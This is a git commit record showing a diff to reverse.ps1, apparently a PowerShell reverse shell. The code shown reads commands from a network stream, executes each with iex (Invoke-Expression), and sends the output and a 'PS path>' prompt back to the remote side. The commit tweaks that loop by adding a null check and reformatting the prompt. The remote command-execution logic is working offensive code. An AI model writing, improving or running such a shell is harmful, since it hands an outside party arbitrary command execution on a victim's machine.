3bf8257b2d9122f0f8fdd254ea6f9927b2e954d5
joetanx <90442032+joetanx@users.noreply.github.com>
2026-01-25 13:53:58 +0800

    Update reverse.ps1

--- reverse.ps1
+++ reverse.ps1
@@ -4,8 +4,8 @@ $stream = $client.GetStream()
 [byte[]]$bytes = 0..65535|%{0}
 do {
 $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
-$sendback = (iex $data 2>&1 | Out-String )
-$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
+if($data) { $sendback = (iex $data 2>&1 | Out-String ) }
+$sendback2 = $sendback + "PS $($pwd.Path)> "
 $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
 $stream.Write($sendbyte,0,$sendbyte.Length)
 $stream.Flush()
